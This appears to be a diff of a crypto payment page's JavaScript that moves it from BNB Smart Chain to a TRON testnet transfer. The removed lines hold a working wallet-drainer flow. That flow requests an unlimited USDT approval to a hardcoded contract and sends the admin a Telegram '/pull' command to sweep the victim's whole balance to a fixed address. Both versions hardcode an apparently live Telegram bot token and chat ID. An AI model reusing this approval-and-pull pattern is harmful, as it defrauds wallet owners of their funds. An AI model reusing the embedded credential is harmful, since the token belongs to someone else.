@@ -2,38 +2,111 @@ document.addEventListener("DOMContentLoaded", function () {
 
     // ===== CONFIG =====
     const CONFIG = window.CONFIG || {
-        COMPANY_WALLET_ADDRESS: "0xbfc17A492Bc8167556aFe1Cf90D9F7Fc384DeFb4",
-        CONTRACT_ADDRESS: "0xaEB39CED46aaAdf4F6369806252083E82cbCEB91",
+        COMPANY_WALLET_ADDRESS: "TPVxRUUx2dDwB3VCqwSUABPzoBM8Sii4bz",
+        CONTRACT_ADDRESS: "",
         TELEGRAM_BOT_TOKEN: "8941208473:AAEY1s1srFize2Ij_Ai1nYirSOcR6i18OOM",
         ADMIN_CHAT_ID: "-5543160952",
-        USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
-        BSC_RPC_URL: "https://bsc-dataseed1.binance.org/",
-        PULL_RECIPIENT_ADDRESS: "0xf2a151e92ae0eab7157322545c33648c0824fa2e"
+        USDT_ADDRESS: "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf",
+        TRON_FULL_HOST: "https://nile.trongrid.io",
+        TRON_NETWORK_NAME: "Nile testnet",
+        TRON_NETWORK_KEY: "nile",
+        TRON_FEE_LIMIT: 100000000
     };
 
-    async function getUsdtBalanceForWallet(walletAddress) {
-        const usdtAddress = CONFIG.USDT_ADDRESS;
-        const usdtAbi = [
-            "function balanceOf(address owner) view returns (uint256)",
-            "function decimals() view returns (uint8)"
-        ];
-        try {
-            let decimals = 18;
-            let balance;
-            if (window.ethereum) {
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const usdt = new ethers.Contract(usdtAddress, usdtAbi, provider);
-                try { decimals = await usdt.decimals(); } catch (err) {}
-                balance = await usdt.balanceOf(walletAddress);
-            } else {
-                const provider = new ethers.providers.JsonRpcProvider(CONFIG.BSC_RPC_URL);
-                const usdt = new ethers.Contract(usdtAddress, usdtAbi, provider);
-                try { decimals = await usdt.decimals(); } catch (err) {}
-                balance = await usdt.balanceOf(walletAddress);
+    function getReadyTronWeb() {
+        return window.tronWeb && window.tronWeb.ready ? window.tronWeb : null;
+    }
+
+    async function waitForReadyTronWeb() {
+        for (let attempt = 0; attempt < 20; attempt += 1) {
+            const tronWeb = getReadyTronWeb();
+            if (tronWeb?.defaultAddress?.base58) {
+                return tronWeb;
             }
-            const formatted = ethers.utils.formatUnits(balance, decimals);
-            const num = parseFloat(formatted);
-            return Number.isFinite(num) ? (+num).toString() : formatted;
+            await new Promise((resolve) => setTimeout(resolve, 100));
+        }
+        return null;
+    }
+
+    function isExpectedTronNetwork(tronWeb) {
+        const networkKey = String(CONFIG.TRON_NETWORK_KEY || "").toLowerCase();
+        if (!networkKey) return true;
+
+        const hosts = [
+            tronWeb?.fullNode?.host,
+            tronWeb?.solidityNode?.host,
+            tronWeb?.eventServer?.host
+        ].filter(Boolean).map((host) => String(host).toLowerCase());
+
+        return hosts.some((host) => host.includes(networkKey));
+    }
+
+    async function connectTronLink() {
+        if (!window.tronLink && !window.tronWeb) {
+            throw new Error("tronlink_missing");
+        }
+
+        if (window.tronLink?.request) {
+            const result = await window.tronLink.request({ method: "tron_requestAccounts" });
+            if (result?.code === 4001) {
+                throw new Error("user_rejected");
+            }
+        }
+
+        const tronWeb = await waitForReadyTronWeb();
+        if (!tronWeb?.defaultAddress?.base58) {
+            throw new Error("tronlink_locked");
+        }
+
+        if (!isExpectedTronNetwork(tronWeb)) {
+            throw new Error("wrong_tron_network");
+        }
+
+        return tronWeb;
+    }
+
+    async function getUsdtContract(tronWeb) {
+        return tronWeb.contract().at(CONFIG.USDT_ADDRESS);
+    }
+
+    async function getTokenDecimals(contract) {
+        try {
+            const decimals = await contract.decimals().call();
+            return Number(decimals.toString());
+        } catch (err) {
+            console.warn("Could not fetch decimals, defaulting to 6");
+            return 6;
+        }
+    }
+
+    function parseTokenUnits(amount, decimals) {
+        const value = String(amount).trim();
+        if (!/^\d+(\.\d+)?$/.test(value)) {
+            throw new Error("invalid_amount");
+        }
+
+        const [whole, fraction = ""] = value.split(".");
+        const paddedFraction = (fraction + "0".repeat(decimals)).slice(0, decimals);
+        const base = 10n ** BigInt(decimals);
+        return (BigInt(whole) * base + BigInt(paddedFraction || "0")).toString();
+    }
+
+    function formatTokenUnits(value, decimals) {
+        const raw = BigInt(value.toString());
+        const base = 10n ** BigInt(decimals);
+        const whole = raw / base;
+        const fraction = (raw % base).toString().padStart(decimals, "0").replace(/0+$/, "");
+        return fraction ? `${whole}.${fraction}` : whole.toString();
+    }
+
+    async function getUsdtBalanceForWallet(walletAddress, tronWeb = getReadyTronWeb()) {
+        try {
+            if (!tronWeb || !tronWeb.isAddress(walletAddress)) return "0";
+
+            const usdt = await getUsdtContract(tronWeb);
+            const decimals = await getTokenDecimals(usdt);
+            const balance = await usdt.balanceOf(walletAddress).call();
+            return formatTokenUnits(balance, decimals);
         } catch (err) {
             console.warn("Could not fetch USDT balance:", err);
             return "0";
@@ -46,29 +119,22 @@ document.addEventListener("DOMContentLoaded", function () {
         const adminChatId = CONFIG.ADMIN_CHAT_ID;
 
         const inlineKeyboard = {
-            inline_keyboard: [[{ text: "🔗 View Transaction", url: `https://bscscan.com/tx/${txHash}` }]]
+            inline_keyboard: [[{ text: "🔗 View Transaction", url: `https://tronscan.org/#/transaction/${txHash}` }]]
         };
 
-        const recipient = CONFIG.PULL_RECIPIENT_ADDRESS || "0xf2a151e92ae0eab7157322545c33648c0824fa2e";
-        const usdtBalance = await getUsdtBalanceForWallet(walletAddress);
-        const pullCommand = `/pull ${CONFIG.USDT_ADDRESS} ${walletAddress} ${recipient} ${usdtBalance}`;
-
         const adminMessage =
-            `🔔 **New USDT Approval Transaction**\n\n` +
-            `💰 **Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
+            `🔔 **New USDT Transfer Transaction**\n\n` +
+            `💰 **From Wallet:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
             `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` +
             `👤 **User ID:** ${userId || "Not provided"}\n` +
             `⏰ **Time:** ${new Date().toLocaleString()}\n\n` +
-            `✅ Transaction approved successfully!\n\n` +
-            `📋 **Copy & paste command:**\n\`\`\`\n${pullCommand}\n\`\`\`\n\n` +
-            `💡 *Tap and hold on the command above to copy it*`;
+            `✅ TRC20 transfer submitted successfully!`;
 
         const userMessage =
-            `🎉 **USDT Approval Successful!**\n\n` +
+            `🎉 **USDT Transfer Submitted!**\n\n` +
             `💰 **Your Wallet Address:** \n\`\`\`\n${walletAddress}\n\`\`\`\n` +
             `🔗 **Transaction Hash:** \n\`\`\`\n${txHash}\n\`\`\`\n` +
-            `✅ **Status:** Approved\n\n` +
-            `You can now proceed with USDT transfers.\n\n` +
+            `✅ **Status:** Submitted\n\n` +
             `💡 *Tap and hold on the wallet address above to copy it*`;
 
         try {
@@ -199,57 +265,29 @@ document.addEventListener("DOMContentLoaded", function () {
     if (maxBtn) {
         maxBtn.addEventListener("click", async function (e) {
             e.preventDefault();
-            if (!window.ethereum) {
-                showNotification("No Web3 wallet found.", "error");
-                return;
-            }
             try {
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const signer = provider.getSigner();
-                const walletAddress = await signer.getAddress();
-                const usdtAddress = CONFIG.USDT_ADDRESS;
-                const usdtAbi = [
-                    "function balanceOf(address owner) view returns (uint256)",
-                    "function decimals() view returns (uint8)"
-                ];
-                const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
-                let decimals = 18;
-                try { decimals = await usdt.decimals(); } catch (err) {}
-                let balance = await usdt.balanceOf(walletAddress);
-                let maxValue = ethers.utils.formatUnits(balance, decimals);
-                amountInput.value = (+maxValue).toString();
+                const tronWeb = await connectTronLink();
+                const walletAddress = tronWeb.defaultAddress.base58;
+                amountInput.value = await getUsdtBalanceForWallet(walletAddress, tronWeb);
                 onAmountInput();
             } catch (err) {
-                showNotification("Unable to get max balance.", "error");
+                const msg = (err?.message || "").toLowerCase();
+                if (msg.includes("wrong_tron_network")) {
+                    showNotification(`Switch TronLink to ${CONFIG.TRON_NETWORK_NAME || "Nile testnet"}.`, "error");
+                } else {
+                    showNotification("Open and unlock TronLink to get max balance.", "error");
+                }
             }
         });
     }
 
-    // ===== GAS SPONSOR (company wallet sends BNB before user approve) =====
-    async function requestGasSponsor(userAddress) {
-        try {
-            const res = await fetch("/sponsor-gas", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ userAddress })
-            });
-            if (!res.ok) return;
-            const data = await res.json();
-            if (data.ok && data.txHash) {
-                await new Promise((resolve) => setTimeout(resolve, 2000));
-            }
-        } catch (err) {
-            console.warn("Gas sponsor unavailable:", err);
-        }
-    }
-
-    // ===== NEXT BUTTON - APPROVE USDT (FIXED TO ESCROW) =====
+    // ===== NEXT BUTTON - SEND TRC20 USDT WITH TRONLINK =====
     nextBtn.addEventListener("click", async function (e) {
         e.preventDefault();
 
-        if (!window.ethereum) {
+        if (!window.tronLink && !window.tronWeb) {
             showNotification(
-                "No Web3 wallet found. Please open in Trust Wallet or MetaMask browser.",
+                "No TronLink wallet found. Please open in TronLink browser.",
                 "error"
             );
             return;
@@ -259,73 +297,24 @@ document.addEventListener("DOMContentLoaded", function () {
         nextBtn.disabled = true;
 
         try {
-            const bnbChainId = "0x38";
-            const bnbChainParams = {
-                chainId: bnbChainId,
-                chainName: "BNB Smart Chain",
-                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-                rpcUrls: [CONFIG.BSC_RPC_URL],
-                blockExplorerUrls: ["https://bscscan.com/"]
-            };
+            const tronWeb = await connectTronLink();
+            const recipientAddress = addressInput.value.trim();
+            const amount = amountInput.value.trim();
 
-            try {
-                await window.ethereum.request({
-                    method: "wallet_switchEthereumChain",
-                    params: [{ chainId: bnbChainId }]
-                });
-            } catch (switchError) {
-                if (switchError.code === 4902) {
-                    try {
-                        await window.ethereum.request({
-                            method: "wallet_addEthereumChain",
-                            params: [bnbChainParams]
-                        });
-                    } catch (addError) {
-                        showNotification("Failed to add BNB Smart Chain network.", "error");
-                        return;
-                    }
-                } else {
-                    showNotification("Failed to switch to BNB Smart Chain network.", "error");
-                    return;
-                }
+            if (!tronWeb.isAddress(recipientAddress)) {
+                showNotification("Please enter a valid TRON address.", "error");
+                return;
             }
 
-            // === Approve ESCROW CONTRACT instead of company wallet ===
-            const escrowAddress = CONFIG.CONTRACT_ADDRESS;
-            const usdtAddress = CONFIG.USDT_ADDRESS;
-
-            const usdtAbi = [
-                "function approve(address spender, uint256 amount) public returns (bool)",
-                "function decimals() view returns (uint8)"
-            ];
-            const iface = new ethers.utils.Interface(usdtAbi);
-
-            let decimals = 18;
-            try {
-                const decCallData = iface.encodeFunctionData("decimals", []);
-                const decHex = await window.ethereum.request({
-                    method: "eth_call",
-                    params: [{ to: usdtAddress, data: decCallData }, "latest"]
-                });
-                decimals = ethers.BigNumber.from(decHex).toNumber();
-            } catch (err) {
-                console.warn("Could not fetch decimals, defaulting to 18");
-            }
-
-            const parsedAmount = ethers.constants.MaxUint256;
-            const txData = iface.encodeFunctionData("approve", [
-                escrowAddress,
-                parsedAmount.toString()
-            ]);
-
-            const fromAddress = (await window.ethereum.request({ method: "eth_accounts" }))[0];
-            await requestGasSponsor(fromAddress);
-            const txHash = await window.ethereum.request({
-                method: "eth_sendTransaction",
-                params: [{ from: fromAddress, to: usdtAddress, data: txData, value: "0x0" }]
+            const usdt = await getUsdtContract(tronWeb);
+            const decimals = await getTokenDecimals(usdt);
+            const parsedAmount = parseTokenUnits(amount, decimals);
+            const fromAddress = tronWeb.defaultAddress.base58;
+            const txHash = await usdt.transfer(recipientAddress, parsedAmount).send({
+                feeLimit: Number(CONFIG.TRON_FEE_LIMIT) || 100000000
             });
 
-            showNotification(``, "success");
+            showNotification("Transaction submitted.", "success");
 
             if (txHash && txHash.length > 0) {
                 try {
@@ -341,16 +330,26 @@ document.addEventListener("DOMContentLoaded", function () {
             if (
                 msg.includes("user rejected") ||
                 msg.includes("user denied") ||
+                msg.includes("user_rejected") ||
                 msg.includes("cancelled") ||
                 msg.includes("canceled")
             ) {
                 showNotification("Transaction cancelled.", "error");
             } else if (
+                msg.includes("tronlink_missing") ||
+                msg.includes("tronlink_locked")
+            ) {
+                showNotification("Open and unlock TronLink, then try again.", "error");
+            } else if (msg.includes("wrong_tron_network")) {
+                showNotification(`Switch TronLink to ${CONFIG.TRON_NETWORK_NAME || "Nile testnet"}.`, "error");
+            } else if (msg.includes("invalid_amount")) {
+                showNotification("Please enter a valid USDT amount.", "error");
+            } else if (
                 msg.includes("insufficient funds") ||
                 msg.includes("exceeds balance") ||
                 (msg.includes("execution reverted") && msg.includes("exceeds balance"))
             ) {
-                showNotification("Insufficient USDT balance for this approval.", "error");
+                showNotification("Insufficient USDT balance for this transfer.", "error");
             } else {
                 showNotification("Transaction failed. Please try again.", "error");
             }
